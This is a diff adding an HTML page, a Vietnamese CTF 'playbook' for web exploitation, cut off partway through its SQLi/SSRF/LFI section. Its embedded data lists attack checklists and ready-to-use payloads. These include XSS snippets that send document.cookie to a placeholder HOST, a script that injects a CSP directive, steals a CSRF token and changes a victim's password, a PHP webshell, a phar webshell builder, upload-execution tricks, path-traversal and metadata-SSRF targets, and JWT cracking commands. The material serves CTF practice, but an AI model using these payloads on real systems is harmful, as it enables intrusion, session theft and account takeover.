@@ -1,0 +1,1674 @@
+<!doctype html>
+<html lang="vi">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>CTF Playbook — Web &amp; Pwn</title>
+<style>
+:root{
+  --paper:#f7f5f0;
+  --surface:#fffdf8;
+  --surface-2:#f1ede5;
+  --ink:#171411;
+  --muted:#6f6a61;
+  --faint:#a39d92;
+  --line:#ddd7cc;
+  --line-strong:#c9c1b2;
+  --accent:#d92d20;
+  --accent-dark:#a61b12;
+  --amber:#a15c00;
+  --green:#1f7a4d;
+  --mono:ui-monospace,SFMono-Regular,Menlo,Consolas,"Liberation Mono",monospace;
+  --sans:ui-sans-serif,system-ui,-apple-system,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;
+}
+*{box-sizing:border-box}
+html,body{margin:0;min-height:100%}
+body{background:var(--paper);color:var(--ink);font:14px/1.55 var(--sans);-webkit-font-smoothing:antialiased}
+button,input{font:inherit}
+button{cursor:pointer}
+a{color:var(--accent);text-decoration:underline;text-underline-offset:2px;text-decoration-color:rgba(217,45,32,.35)}
+a:hover{text-decoration-color:var(--accent)}
+code,pre{font-family:var(--mono)}
+::selection{background:var(--accent);color:var(--surface)}
+*{scrollbar-width:thin;scrollbar-color:var(--line-strong) transparent}
+
+.topbar{position:sticky;top:0;z-index:20;display:flex;align-items:center;gap:22px;padding:0 24px;height:64px;background:var(--paper);border-bottom:1px solid var(--line)}
+.brand{display:flex;align-items:center;gap:11px;min-width:260px}
+.brand-mark{width:32px;height:32px;display:grid;place-items:center;background:var(--ink);color:var(--paper);font-family:var(--mono);font-size:11px;font-weight:700;letter-spacing:.04em;border-bottom:3px solid var(--accent)}
+.brand-text strong{display:block;font-size:14px;font-weight:800;letter-spacing:-.02em}
+.brand-text strong span{color:var(--accent)}
+.brand-text small{display:block;font-family:var(--mono);font-size:8.5px;letter-spacing:.16em;text-transform:uppercase;color:var(--faint);margin-top:1px}
+.search-wrap{flex:1;max-width:620px}
+#search{width:100%;background:var(--surface);border:1px solid var(--line);border-bottom-color:var(--line-strong);color:var(--ink);border-radius:0;padding:9px 12px;font-size:13px;outline:none}
+#search::placeholder{color:var(--faint)}
+#search:focus{border-color:var(--accent);box-shadow:inset 0 -2px 0 var(--accent)}
+.top-progress{font-family:var(--mono);font-size:10px;letter-spacing:.06em;color:var(--muted);white-space:nowrap}
+
+.shell{display:grid;grid-template-columns:272px minmax(0,1fr);min-height:calc(100vh - 64px)}
+.sidebar{border-right:1px solid var(--line);padding:8px 0 28px;overflow:auto;max-height:calc(100vh - 64px);position:sticky;top:64px;background:var(--paper)}
+.section-title{display:flex;align-items:baseline;justify-content:space-between;gap:10px;margin:22px 18px 5px;padding-top:12px;border-top:1px solid var(--line);font-family:var(--mono);font-size:8.5px;letter-spacing:.16em;text-transform:uppercase;color:var(--faint)}
+.section-title:first-child{margin-top:8px;border-top:0;padding-top:0}
+.section-title .count{color:var(--accent);font-weight:700}
+.nav-item{display:flex;width:100%;text-align:left;background:none;border:0;border-left:2px solid transparent;border-radius:0;color:var(--ink);padding:8px 18px;gap:8px;align-items:center;justify-content:space-between;font-size:13px}
+.nav-item:hover{background:var(--surface-2)}
+.nav-item.active{border-left-color:var(--accent);background:var(--surface-2);font-weight:650}
+.nav-title{display:flex;gap:8px;align-items:center;min-width:0;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.dot{width:5px;height:5px;flex:0 0 auto;background:var(--faint)}
+.dot.high{background:var(--accent)} .dot.medium{background:var(--amber)} .dot.low{background:var(--faint)}
+.nav-progress{font-family:var(--mono);font-size:9px;color:var(--faint);white-space:nowrap}
+.sidebar-footer{display:flex;flex-wrap:wrap;gap:7px;margin:22px 18px 0;padding-top:14px;border-top:1px solid var(--line)}
+.btn{background:transparent;border:1px solid var(--line-strong);border-radius:0;padding:6px 8px;color:var(--muted);font-family:var(--mono);font-size:8.5px;letter-spacing:.1em;text-transform:uppercase}
+.btn:hover{border-color:var(--ink);color:var(--ink)}
+
+.main{min-width:0;background:var(--paper)}
+.tabbar{display:flex;gap:0;padding:0 24px;border-bottom:1px solid var(--line);overflow-x:auto;position:sticky;top:64px;background:var(--paper);z-index:10}
+.tab{display:flex;align-items:center;gap:2px;border:0;border-right:1px solid var(--line);border-radius:0;background:transparent;max-width:270px}
+.tab.active{background:var(--surface);box-shadow:inset 0 -2px 0 var(--accent)}
+.tab-label{background:none;border:0;color:var(--muted);padding:11px 10px 11px 14px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;max-width:210px;font-size:12px}
+.tab.active .tab-label{color:var(--ink);font-weight:650}
+.tab-close{background:none;border:0;color:var(--faint);padding:9px 10px;font-size:14px;line-height:1}
+.tab-close:hover{color:var(--accent)}
+.tab-empty{color:var(--faint);font-size:11px;padding:12px 2px;font-family:var(--mono);letter-spacing:.06em}
+
+.content{padding:34px 42px 90px;max-width:1000px;counter-reset:block}
+.crumb{font-family:var(--mono);font-size:9px;letter-spacing:.14em;text-transform:uppercase;color:var(--accent);margin-bottom:12px}
+.item-head{margin:0 0 10px}
+h1{font-size:34px;line-height:1.08;letter-spacing:-.04em;margin:0 0 10px;font-weight:800}
+.summary{color:var(--muted);margin:0;max-width:720px;font-size:14.5px}
+.tags{display:flex;flex-wrap:wrap;gap:0;margin:16px 0 8px;font-family:var(--mono);font-size:8.5px;letter-spacing:.1em;text-transform:uppercase;color:var(--faint)}
+.tag{border:0;background:none;padding:0;border-radius:0;color:var(--faint);font-size:8.5px}
+.tag:not(:last-child)::after{content:" / ";color:var(--line-strong);margin:0 6px}
+.tag.high{color:var(--accent)} .tag.medium{color:var(--amber)}
+.progress-row{display:flex;align-items:center;gap:12px;margin:16px 0 8px}
+.progress-track{height:2px;background:var(--line);flex:1;overflow:hidden}
+.progress-fill{height:100%;background:var(--accent);width:0;transition:width .2s}
+.progress-text{font-family:var(--mono);font-size:9px;letter-spacing:.08em;text-transform:uppercase;color:var(--muted)}
+
+.card{border:0;border-top:1px solid var(--line);background:transparent;border-radius:0;padding:20px 0 24px;margin:0;counter-increment:block}
+.card h2{display:flex;gap:8px;font-family:var(--mono);font-size:9px;letter-spacing:.16em;text-transform:uppercase;color:var(--ink);margin:0 0 14px;font-weight:700}
+.card h2::before{content:counter(block,decimal-leading-zero);color:var(--accent)}
+.card h2::after{content:"/";color:var(--line-strong);order:-1?}
+.card p{margin:0;color:var(--muted)}
+ul{padding-left:18px;margin:6px 0}
+li{margin:5px 0}
+
+.check{display:flex;gap:10px;align-items:flex-start;padding:9px 0;border-bottom:1px solid var(--line);cursor:pointer;font-size:13.5px}
+.check:last-child{border-bottom:0}
+.check input{appearance:none;-webkit-appearance:none;width:14px;height:14px;border:1px solid var(--line-strong);background:var(--surface);margin:2px 0 0;flex:0 0 auto;position:relative;border-radius:0}
+.check input:checked{background:var(--accent);border-color:var(--accent)}
+.check input:checked::after{content:"";position:absolute;left:4px;top:1px;width:4px;height:8px;border:solid var(--surface);border-width:0 2px 2px 0;transform:rotate(45deg)}
+.check input:checked + span{color:var(--faint);text-decoration:line-through;text-decoration-color:var(--line-strong)}
+
+.chips{display:flex;flex-wrap:wrap;gap:0;font-size:13px}
+.chip{border:0;background:none;padding:0;border-radius:0;color:var(--ink);font-size:13px}
+.chip:not(:last-child)::after{content:" / ";color:var(--accent);margin:0 6px}
+
+.tree{display:grid;gap:0}
+.tree-card{display:grid;grid-template-columns:220px 1fr;gap:24px;border:0;border-bottom:1px solid var(--line);border-radius:0;padding:13px 0;background:transparent}
+.tree-card:last-child{border-bottom:0}
+.tree-sign{font-weight:650;font-size:13.5px}
+.tree-actions{margin:0;padding-left:17px;color:var(--muted);font-size:13px}
+
+.code-block{border:1px solid var(--line);border-radius:0;overflow:hidden;margin:12px 0;background:var(--surface-2)}
+.code-head{display:flex;justify-content:space-between;align-items:center;gap:10px;padding:8px 12px;border-bottom:1px solid var(--line);font-family:var(--mono);font-size:8.5px;letter-spacing:.1em;text-transform:uppercase;color:var(--muted)}
+.copy{background:transparent;border:1px solid var(--line-strong);border-radius:0;color:var(--accent);padding:4px 7px;font-family:var(--mono);font-size:8.5px;letter-spacing:.08em;text-transform:uppercase}
+.copy:hover{background:var(--accent);border-color:var(--accent);color:var(--surface)}
+.copy.ok{background:var(--accent);border-color:var(--accent);color:var(--surface)}
+pre{margin:0;padding:14px;overflow:auto;font-size:12px;line-height:1.55;background:var(--surface);color:var(--ink);border-left:3px solid var(--accent)}
+
+.links{display:flex;flex-wrap:wrap;gap:8px 20px;font-size:13px}
+.links a{text-decoration-thickness:1px}
+.links a::after{content:" ↗";color:var(--faint);font-size:10px}
+.callout{border:0;border-left:3px solid var(--accent);background:var(--surface-2);border-radius:0;padding:12px 14px;color:var(--ink);margin:0 0 22px;font-size:13px}
+
+.welcome{max-width:880px}
+.kicker{font-family:var(--mono);font-size:9px;letter-spacing:.16em;text-transform:uppercase;color:var(--accent);margin-bottom:12px}
+.welcome h1{font-size:42px;letter-spacing:-.05em;max-width:640px}
+.quick-grid{display:block;border-top:1px solid var(--line);margin:20px 0 26px}
+.quick{display:block;width:100%;text-align:left;background:transparent;border:0;border-bottom:1px solid var(--line);border-radius:0;padding:11px 8px;color:var(--ink)}
+.quick:hover{background:var(--surface-2)}
+.quick::before{content:"→";color:var(--accent);font-family:var(--mono);margin-right:10px}
+.quick strong{font-size:14.5px;font-weight:650}
+.quick small{display:block;color:var(--muted);font-size:12.5px;margin-top:2px;padding-left:22px}
+
+.toast{position:fixed;bottom:22px;left:50%;transform:translate(-50%,16px);background:var(--ink);border:1px solid var(--ink);color:var(--paper);padding:9px 13px;border-radius:0;opacity:0;pointer-events:none;transition:.18s;z-index:50;font-family:var(--mono);font-size:9px;letter-spacing:.08em;text-transform:uppercase}
+.toast.show{opacity:1;transform:translate(-50%,0)}
+
+/* ---- lab workspace ---- */
+.brand{cursor:pointer}
+.nav-empty{padding:8px 18px;color:var(--faint);font-size:12px}
+.btn-primary{background:var(--accent);border-color:var(--accent);color:var(--surface);font-weight:700}
+.btn-primary:hover{background:var(--accent-dark);border-color:var(--accent-dark);color:var(--surface)}
+.btn-danger{color:var(--accent);border-color:rgba(217,45,32,.35)}
+.btn-danger:hover{background:var(--accent);border-color:var(--accent);color:var(--surface)}
+.tab-add{align-self:stretch;background:transparent;border:0;border-right:1px solid var(--line);color:var(--muted);padding:0 13px;font-size:18px;line-height:1}
+.tab-add:hover{color:var(--accent);background:var(--surface-2)}
+.tab-label{display:flex;align-items:center;gap:7px}
+.tab-label span:last-child{overflow:hidden;text-overflow:ellipsis}
+.status-dot{width:6px;height:6px;flex:0 0 auto;display:inline-block;background:var(--faint)}
+.status-dot.todo{background:var(--faint)}
+.status-dot.doing{background:var(--amber)}
+.status-dot.solved{background:var(--green)}
+.board-actions{display:flex;flex-wrap:wrap;gap:8px;margin:18px 0 16px}
+.lab-list{border-top:1px solid var(--line);margin:0 0 26px}
+.lab-row{display:flex;align-items:center;gap:12px;width:100%;text-align:left;background:transparent;border:0;border-bottom:1px solid var(--line);padding:12px 6px;color:var(--ink);border-radius:0}
+.lab-row:hover{background:var(--surface-2)}
+.lab-row-main{flex:1;min-width:0;display:flex;flex-direction:column;gap:2px}
+.lab-row-main strong{font-size:14.5px;font-weight:650;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.lab-row-main small{font-family:var(--mono);font-size:8.5px;letter-spacing:.08em;text-transform:uppercase;color:var(--faint)}
+.lab-row-meta{font-family:var(--mono);font-size:8.5px;letter-spacing:.06em;text-transform:uppercase;color:var(--muted);white-space:nowrap}
+.empty-state{border-bottom:1px solid var(--line);padding:22px 6px;color:var(--muted);font-size:13px}
+.board-help{border-top:1px solid var(--line);padding-top:18px;max-width:680px}
+.board-help h2{font-family:var(--mono);font-size:9px;letter-spacing:.16em;text-transform:uppercase;margin:0 0 8px;color:var(--ink)}
+.board-help ul{color:var(--muted);font-size:13px}
+
+.lab-title{display:block;width:100%;background:transparent;border:0;border-bottom:1px solid transparent;color:var(--ink);font-size:34px;font-weight:800;letter-spacing:-.04em;padding:0 0 6px;outline:none}
+.lab-title:focus{border-bottom-color:var(--accent)}
+.lab-meta{display:flex;flex-wrap:wrap;align-items:flex-end;gap:18px;margin:14px 0 24px;padding-bottom:14px;border-bottom:1px solid var(--line)}
+.field{display:flex;flex-direction:column;gap:4px;min-width:120px}
+.field span{font-family:var(--mono);font-size:8.5px;letter-spacing:.12em;text-transform:uppercase;color:var(--faint)}
+.field select,.field input,.field-input{background:transparent;border:0;border-bottom:1px solid var(--line-strong);color:var(--ink);padding:5px 2px;font-size:13px;outline:none;border-radius:0;min-width:100px}
+.field select:focus,.field input:focus,.field-input:focus{border-bottom-color:var(--accent)}
+.field-wide{flex:1;min-width:220px}
+.lab-updated{font-family:var(--mono);font-size:8.5px;letter-spacing:.08em;text-transform:uppercase;color:var(--faint);margin-left:auto}
+.lab-grid{display:grid;grid-template-columns:minmax(0,1fr) 250px;gap:36px;align-items:start}
+.block{border-top:1px solid var(--line);padding:18px 0 22px}
+.block-head{display:flex;align-items:baseline;justify-content:space-between;gap:12px;margin-bottom:10px}
+.block h2,.rail-block h2{font-family:var(--mono);font-size:9px;letter-spacing:.16em;text-transform:uppercase;margin:0;color:var(--ink)}
+.block-meta{font-family:var(--mono);font-size:9px;letter-spacing:.06em;color:var(--faint)}
+.lab-notes{width:100%;min-height:300px;resize:vertical;background:var(--surface);border:1px solid var(--line);border-left:3px solid var(--accent);border-radius:0;color:var(--ink);padding:14px;font:12.5px/1.6 var(--mono);outline:none}
+.lab-notes:focus{border-color:var(--line-strong);border-left-color:var(--accent)}
+.lab-rail{border-top:1px solid var(--line);padding-top:18px}
+.rail-block{padding:0 0 18px;margin:0 0 18px;border-bottom:1px solid var(--line)}
+.rail-block:last-child{border-bottom:0;margin-bottom:0;padding-bottom:0}
+.rail-block h2{margin-bottom:9px}
+.rail-block .btn{margin-top:10px}
+.field-input{width:100%;display:block;font-family:var(--mono);font-size:12px}
+.ref-links{display:flex;flex-direction:column;gap:0}
+.ref-link{background:transparent;border:0;border-bottom:1px solid var(--line);padding:7px 0;text-align:left;color:var(--ink);font-size:12.5px}
+.ref-link:hover{color:var(--accent)}
+.ref-link::after{content:" ↗";color:var(--faint);font-size:10px}
+.rail-actions{display:flex;flex-wrap:wrap;gap:7px}
+
+/* ---- reference drawer ---- */
+.ref-backdrop{position:fixed;inset:0;background:rgba(23,20,17,.35);z-index:40;backdrop-filter:blur(2px)}
+.ref-drawer{position:fixed;top:0;right:0;bottom:0;width:min(560px,92vw);background:var(--paper);border-left:1px solid var(--line-strong);z-index:41;overflow:auto;box-shadow:-20px 0 60px rgba(23,20,17,.12);animation:ref-in .16s ease-out}
+@keyframes ref-in{from{transform:translateX(18px);opacity:.7}to{transform:none;opacity:1}}
+.ref-head{padding:24px 26px 16px;border-bottom:1px solid var(--line);background:var(--paper)}
+.ref-head-top{display:flex;align-items:center;justify-content:space-between;gap:12px}
+.ref-head h2{font-size:24px;line-height:1.15;letter-spacing:-.03em;margin:6px 0 8px;font-weight:800}
+.ref-close{background:transparent;border:1px solid var(--line-strong);color:var(--muted);width:28px;height:28px;font-size:18px;line-height:1;border-radius:0}
+.ref-close:hover{border-color:var(--accent);color:var(--accent)}
+.ref-tabs{display:flex;gap:0;border-bottom:1px solid var(--line);padding:0 20px;overflow-x:auto;position:sticky;top:0;background:var(--paper);z-index:2}
+.ref-tab{background:transparent;border:0;border-bottom:2px solid transparent;padding:10px 9px;color:var(--muted);font-family:var(--mono);font-size:8.5px;letter-spacing:.1em;text-transform:uppercase;white-space:nowrap}
+.ref-tab:hover{color:var(--ink)}
+.ref-tab.active{color:var(--ink);border-bottom-color:var(--accent)}
+.ref-body{padding:20px 26px 60px}
+.ref-body .chips,.ref-body .tree,.ref-body .check,.ref-body .code-block,.ref-body .links{margin-top:0}
+
+@media(max-width:900px){
+  .topbar{height:auto;min-height:64px;flex-wrap:wrap;padding:10px 16px;gap:10px}
+  .brand{min-width:0}
+  .search-wrap{order:3;flex-basis:100%;max-width:none}
+  .top-progress{display:none}
+  .shell{display:block}
+  .sidebar{position:static;max-height:none;border-right:0;border-bottom:1px solid var(--line)}
+  .content{padding:24px 18px 70px}
+  .tabbar{position:static;padding:0 12px}
+  h1{font-size:28px}
+  .welcome h1{font-size:32px}
+  .tree-card{grid-template-columns:1fr;gap:6px}
+  .tree-actions{padding-left:17px}
+  .brand-text strong{font-size:13px}
+}
+@media(max-width:900px){
+  .lab-grid{grid-template-columns:1fr;gap:0}
+  .lab-rail{border-top:1px solid var(--line);padding-top:18px}
+  .lab-title{font-size:28px}
+  .lab-updated{margin-left:0;width:100%}
+  .lab-row-meta{display:none}
+  .ref-drawer{width:100vw;border-left:0}
+  .ref-head{padding:18px 18px 14px}
+  .ref-body{padding:16px 18px 50px}
+  .tabbar{padding:0 8px}
+}
+@media print{
+  .topbar,.sidebar,.tabbar,.copy,.sidebar-footer{display:none!important}
+  .content{padding:0;max-width:none}
+  body{background:#fff;color:#000}
+  .card,.tree-card,.code-block{border-color:#ccc;background:#fff;color:#000}
+  pre{color:#000;background:#f5f5f5;border-left-color:#000}
+  .summary,.progress-text,.crumb{color:#444}
+  a{color:#000}
+}
+</style>
+</head>
+<body>
+<header class="topbar">
+  <div class="brand">
+    <div class="brand-mark">BK</div>
+    <div class="brand-text"><strong>CTF<span>/</span>PLAYBOOK</strong><small>Web + Pwn · lab workspace</small></div>
+  </div>
+  <div class="search-wrap">
+    <input id="search" type="search" placeholder="Tìm reference: xss, upload, ret2libc... (Ctrl+K)" autocomplete="off" spellcheck="false">
+  </div>
+  <div class="top-progress" id="topProgress"></div>
+</header>
+<div class="shell">
+  <aside class="sidebar" id="sidebar"></aside>
+  <main class="main">
+    <div class="tabbar" id="tabbar"></div>
+    <div class="content" id="content"></div>
+  </main>
+</div>
+<div class="toast" id="toast"></div>
+<script>
+const C = (...lines) => lines.join("\n");
+
+const DATA = [
+  { id: "web", title: "Web", icon: "🌐", items: [] },
+  { id: "pwn", title: "Pwn", icon: "🧨", items: [] },
+  { id: "ttv", title: "TTV patterns", icon: "🏁", items: [] },
+  { id: "arsenal", title: "Arsenal", icon: "🧰", items: [] }
+];
+DATA.find(s => s.id === "web").items.push(
+  {
+    id: "web-decision",
+    title: "Web decision tree",
+    summary: "Đi theo thứ tự: recon → auth → injection → server-side → client-side. Mục tiêu là không bỏ sót bề mặt tấn công.",
+    tags: ["triage", "methodology", "high"],
+    priority: "high",
+    tree: [
+      {
+        sign: "Chỉ có URL, không source",
+        actions: [
+          "Xem source, header, cookie, robots.txt, sitemap.xml",
+          "ffuf/feroxbuster dir + vhost; đọc JS bundle + source map",
+          "Check .git/, .env, backup, .well-known/",
+          "Map endpoint/role/API; so sánh response giữa 2 account"
+        ]
+      },
+      {
+        sign: "Có source code",
+        actions: [
+          "grep sink: eval, exec, system, include, unserialize, pickle, render_template_string",
+          "Đọc route/controller và luồng auth",
+          "So sánh dependency/version với CVE đã biết",
+          "Chạy local, thử input trước khi đánh remote"
+        ]
+      },
+      {
+        sign: "Login / auth / JWT",
+        actions: [
+          "SQLi/NoSQLi login bypass",
+          "Decode JWT: alg none, weak secret, kid, jku/jwks",
+          "Session cookie tamper; password reset; 2FA bypass",
+          "Mass assignment: thêm role/is_admin vào body"
+        ]
+      },
+      {
+        sign: "Input được reflect",
+        actions: [
+          "Xác định context HTML / attribute / JS string / URL",
+          "Test XSS cơ bản; đọc CSP",
+          "Nếu có admin bot: leak CSRF token hoặc cookie",
+          "Test DOM XSS: innerHTML, eval, location"
+        ]
+      },
+      {
+        sign: "Có upload file",
+        actions: [
+          "Test extension/MIME/magic bytes/polyglot",
+          ".htaccess, .user.ini, .phar",
+          "phar:// + deserialization",
+          "Bypass disable_functions: FFI, LD_PRELOAD, imap_open"
+        ]
+      },
+      {
+        sign: "Tham số url= / image= / webhook= / fetch=",
+        actions: [
+          "Thử 127.0.0.1, localhost, [::1], 127.1, 2130706433",
+          "Cloud metadata 169.254.169.254",
+          "file://, gopher://, dict://",
+          "Bypass bằng redirect, @, #, DNS rebinding"
+        ]
+      },
+      {
+        sign: "Tham số file= / page= / include= / template=",
+        actions: [
+          "Path traversal ../../etc/passwd",
+          "PHP wrappers: php://filter, data://, zip://, phar://",
+          "Log poisoning / session file / /proc/self/environ",
+          "pearcmd, filter chain CVE-2024-2961"
+        ]
+      },
+      {
+        sign: "Input vào template engine",
+        actions: [
+          "Polyglot: {{7*7}} ${7*7} #{7*7} <%= 7*7 %>",
+          "Nhận diện engine: Jinja2, Twig, Freemarker, Smarty",
+          "Dùng payload RCE theo engine; thử sandbox bypass"
+        ]
+      },
+      {
+        sign: "Coin / gambling / coupon / ví",
+        actions: [
+          "Race condition: gửi request song song",
+          "Double spend / redeem nhiều lần",
+          "Số âm, overflow, round-down",
+          "Bypass limit bằng nhiều account/request"
+        ]
+      }
+    ],
+    links: [
+      { title: "PortSwigger Web Security Academy", url: "https://portswigger.net/web-security" },
+      { title: "HackTricks", url: "https://book.hacktricks.wiki/" },
+      { title: "PayloadsAllTheThings", url: "https://github.com/swisskyrepo/PayloadsAllTheThings" }
+    ]
+  },
+  {
+    id: "web-recon",
+    title: "Recon & HTTP",
+    summary: "Map endpoint, param, role và tech stack trước khi exploit. 80% thời gian web CTF nằm ở đây.",
+    tags: ["recon", "http", "ffuf"],
+    priority: "high",
+    signals: [
+      "Chỉ có URL, không source",
+      "Có login/register/API và nhiều role",
+      "JS bundle lớn, có source map",
+      "Response header lạ hoặc version cũ"
+    ],
+    checklist: [
+      "Xem source, robots.txt, sitemap.xml, response headers, cookie.",
+      "Liệt kê endpoint từ JS bundle, source map, Swagger/GraphQL.",
+      "ffuf/feroxbuster dir + vhost; arjun tìm param ẩn.",
+      "Check .git/, .env, backup, .well-known/, file cấu hình.",
+      "Xác định framework/version; tra CVE dependency.",
+      "Đăng ký 2 account, so sánh quyền và response.",
+      "Lưu request vào Burp Repeater; ghi chú endpoint lạ."
+    ],
+    commands: [
+      {
+        title: "Dir brute",
+        code: C(
+          "ffuf -u http://TARGET/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -mc all -fs 0",
+          "feroxbuster -u http://TARGET -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt"
+        )
+      },
+      {
+        title: "Headers + git",
+        code: C(
+          "curl -i -s http://TARGET/ | head -40",
+          "git-dumper http://TARGET/.git/ ./repo"
+        )
+      }
+    ],
+    gotchas: [
+      "Thử cả raw IP và Host header khác nhau.",
+      "403/401 vẫn có thể leak endpoint hoặc bypass bằng path encoding.",
+      "Source map có thể chứa toàn bộ source code.",
+      "Đừng bỏ qua OPTIONS, TRACE, methods lạ."
+    ],
+    links: [
+      { title: "PortSwigger Academy", url: "https://portswigger.net/web-security" },
+      { title: "HackTricks — Web methodology", url: "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/index.html" }
+    ]
+  },
+  {
+    id: "web-xss",
+    title: "XSS + CSP + Admin bot",
+    summary: "Reflect → execute → exfil token/cookie. Với TTV, dạng CSP injection + CSRF token leak + bot rất hay ra.",
+    tags: ["xss", "csp", "csrf", "bot"],
+    priority: "high",
+    signals: [
+      "Input được reflect vào HTML/attribute/JS",
+      "Có report/contact admin bot",
+      "Response có CSP header",
+      "Comment, profile, search, todo-app"
+    ],
+    checklist: [
+      "Xác định context: HTML, attribute, JS string, URL.",
+      "Test <script>alert(1)<\/script>, \"><img src=x onerror=alert(1)>, javascript:.",
+      "Đọc CSP: script-src, script-src-elem, nonce/hash, report-uri.",
+      "Tìm param được nối vào CSP header; inject ;script-src-elem 'unsafe-inline';.",
+      "Nếu có bot: fetch same-origin, đọc CSRF token, submit form.",
+      "Exfil bằng fetch('//HOST/?'+btoa(document.cookie)) hoặc navigator.sendBeacon.",
+      "Test DOM XSS: innerHTML, eval, location, postMessage."
+    ],
+    payloads: [
+      {
+        title: "Basic XSS",
+        code: "<script>fetch('//HOST/?'+document.cookie)<\/script>"
+      },
+      {
+        title: "IMG onerror",
+        code: "<img src=x onerror=\"fetch('//HOST/?'+btoa(document.cookie))\">"
+      },
+      {
+        title: "CSP injection + CSRF token leak (Feedbin style)",
+        code: C(
+          "x;script-src-elem 'unsafe-inline';",
+          "<form id=f method=post action=/settings/change_password>",
+          "<input id=t name=_t><input name=new_pw value=pwned><input name=new_pw_confirm value=pwned>",
+          "</form>",
+          "<script>",
+          "async function x(){",
+          "  const r=await fetch('/settings/change_password');",
+          "  const h=await r.text();",
+          '  const m=h.match(/name="_t" value="([^"]+)"/);',
+          "  t.value=m[1]; f.submit();",
+          "}",
+          "x();",
+          "<\/script>"
+        )
+      }
+    ],
+    commands: [
+      { title: "Listener", code: "python3 -m http.server 8000" },
+      { title: "Public tunnel", code: "cloudflared tunnel --url http://localhost:8000" }
+    ],
+    gotchas: [
+      "Cookie HttpOnly thì không đọc được; mục tiêu thường là CSRF token trong HTML.",
+      "script-src-elem có thể override script-src hoàn toàn.",
+      "Bot có timeout ngắn; payload phải chạy nhanh, tránh vòng lặp.",
+      "Bot có thể không ra Internet; ưu tiên fetch same-origin rồi đổi password/flag."
+    ],
+    links: [
+      { title: "Feedbin writeup (kyrux29)", url: "https://github.com/kyrux29/CTF_WRITEUPS" },
+      { title: "PortSwigger XSS", url: "https://portswigger.net/web-security/cross-site-scripting" }
+    ]
+  }
+);
+DATA.find(s => s.id === "web").items.push(
+  {
+    id: "web-upload",
+    title: "Upload → RCE",
+    summary: "Upload không chỉ là đổi extension. Đi theo chuỗi: upload → truy cập → execute → bypass disable_functions.",
+    tags: ["upload", "phar", "rce", "php"],
+    priority: "high",
+    signals: [
+      "Có avatar/attachment/file preview",
+      "Filter extension hoặc MIME",
+      "Có disable_functions trong PHP",
+      "Có include/LFI đi kèm"
+    ],
+    checklist: [
+      "Tìm path upload và URL truy cập file.",
+      "Thử .php, .phtml, .phar, .php5, .htaccess, .user.ini.",
+      "Bypass MIME/magic bytes/polyglot.",
+      "Nếu không exec: .htaccess AddType hoặc .user.ini auto_prepend_file.",
+      "Nếu có phar: tạo phar + include qua phar://.",
+      "Check disable_functions; thử FFI/LD_PRELOAD/imap_open.",
+      "Nếu có readflag: đọc /readflag hoặc /flag."
+    ],
+    payloads: [
+      { title: "PHP webshell", code: "<?php system($_GET['c']); ?>" },
+      { title: ".htaccess", code: "AddType application/x-httpd-php .jpg" },
+      {
+        title: "Tạo phar",
+        code: C(
+          "<?php",
+          "$p = new Phar('shell.phar');",
+          "$p->startBuffering();",
+          "$p->addFromString('test.php', '<?php system($_GET[\"c\"]); ?>');",
+          "$p->setStub('<?php __HALT_COMPILER(); ?>');",
+          "$p->stopBuffering();",
+          "?>"
+        )
+      },
+      {
+        title: "Check disable_functions",
+        code: "<?php var_dump(ini_get('disable_functions')); ?>"
+      }
+    ],
+    commands: [
+      {
+        title: "Build phar + upload",
+        code: C(
+          "php -d phar.readonly=0 make_phar.php",
+          "curl -F 'file=@shell.jpg' http://TARGET/upload"
+        )
+      }
+    ],
+    gotchas: [
+      "Upload dir có thể không execute; cần LFI/include để chạy.",
+      "phar cần phar.readonly=0 khi tạo file.",
+      "open_basedir có thể chặn đọc file ngoài.",
+      "disable_functions có thể bypass bằng FFI, LD_PRELOAD, imap_open, pcntl_exec."
+    ],
+    links: [
+      { title: "Ba bước lên mây revenge writeup", url: "https://github.com/kyrux29/CTF_WRITEUPS" },
+      { title: "PortSwigger File Upload", url: "https://portswigger.net/web-security/file-upload" }
+    ]
+  },
+  {
+    id: "web-jwt",
+    title: "JWT & Auth bypass",
+    summary: "Decode trước, rồi thử alg none, weak secret, kid/jku và claim tampering. Đừng quên cookie/session thường.",
+    tags: ["jwt", "auth", "api"],
+    priority: "high",
+    signals: [
+      "Authorization: Bearer hoặc cookie JWT",
+      "Có alg/kid/jku/x5u trong header",
+      "Role/admin claim trong payload",
+      "API trả token sau login"
+    ],
+    checklist: [
+      "Decode header/payload (base64url).",
+      "Thử alg:none.",
+      "Crack HS256 secret bằng rockyou.",
+      "Thử kid path traversal hoặc SQLi.",
+      "Thử jku/x5u trỏ JWKS của bạn.",
+      "Thử RS256 → HS256 confusion.",
+      "Sửa claim role/admin; kiểm tra exp/iat."
+    ],
+    payloads: [
+      {
+        title: "jwt_tool",
+        code: C(
+          "jwt_tool TOKEN -T",
+          "jwt_tool TOKEN -X a",
+          "hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt"
+        )
+      },
+      {
+        title: "Decode nhanh",
+        code: "echo 'TOKEN' | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null"
+      }
+    ],
+    gotchas: [
+      "base64url thiếu padding; thêm = khi decode.",
+      "Token có thể nằm trong cookie, không chỉ Authorization.",
+      "Server có thể check signature nhưng không check alg.",
+      "Đừng bỏ qua session cookie/flask session nếu không phải JWT."
+    ],
+    links: [
+      { title: "PortSwigger JWT", url: "https://portswigger.net/web-security/jwt" },
+      { title: "jwt_tool", url: "https://github.com/ticarpi/jwt_tool" }
+    ]
+  },
+  {
+    id: "web-injection",
+    title: "SQLi / SSRF / LFI",
+    summary: "Ba lỗi server-side hay ra nhất trong CTF web. Kiểm tra nhanh bằng checklist, rồi đi sâu theo response.",
+    tags: ["sqli", "ssrf", "lfi", "php"],
+    priority: "high",
+    signals: [
+      "id/q/login/sort/search trong URL hoặc body",
+      "url/image/webhook/fetch/import/preview",
+      "file/page/include/template/download",
+      "Response khác nhau theo input"
+    ],
+    checklist: [
+      "SQLi: thử ' , \" , \\ , 1 OR 1=1, comment; xác định DBMS.",
+      "SQLi: union columns, boolean/time blind; thử WAF bypass.",
